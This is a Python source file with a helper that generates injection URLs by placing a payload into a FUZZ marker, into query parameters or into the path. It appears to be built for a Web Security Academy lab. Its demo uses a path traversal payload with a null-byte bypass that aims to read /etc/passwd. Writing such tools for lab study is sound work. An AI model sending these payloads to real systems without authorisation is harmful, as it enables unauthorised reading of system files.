from urllib.parse import (
    urlparse,
    urlunparse
)

import re


def generate_injection_points(
    url: str,
    payload: str
) -> list[str]:

    parsed = urlparse(url)

    #
    # FUZZ placeholder mode
    #

    if "FUZZ" in url.upper():

        injected = re.sub(
            "fuzz",
            payload,
            url,
            flags=re.IGNORECASE
        )

        return [injected]

    #
    # Query parameter mode
    #

    if parsed.query:

        raw_params = parsed.query.split("&")

        injected_urls = []

        for index, param in enumerate(raw_params):

            if "=" not in param:
                continue

            key = param.split("=", 1)[0]

            rebuilt_query = "&".join(
                (
                    f"{key}={payload}"
                    if i == index
                    else p
                )
                for i, p in enumerate(raw_params)
            )

            injected_urls.append(
                urlunparse(
                    parsed._replace(
                        query=rebuilt_query
                    )
                )
            )

        return injected_urls

    #
    # Path mode
    #

    stripped = parsed.path.rstrip("/")

    if not stripped:

        rebuilt_path = "/" + payload

    else:

        parts = stripped.split("/")
        parts[-1] = payload
        rebuilt_path = "/".join(parts)

    return [
        urlunparse(
            parsed._replace(
                path=rebuilt_path
            )
        )
    ]


if __name__ == "__main__":

    urls = [
        "https://site.com/page?a=1&b=fuzz&d=8",
        "https://site.com/page?a=1&b=2&c=3",
        "https://site.com/path/file.txt",
        "https://site.com/page?a=1",
        "https://0a8b00c903f3d4ff80e608d100f800a7.web-security-academy.net/image?filename=/var/www/images/fuzz"
    ]

    for url in urls:

        for injected in generate_injection_points(
            url,
            "../../../etc/passwd%00.png"
        ):
            print(injected)
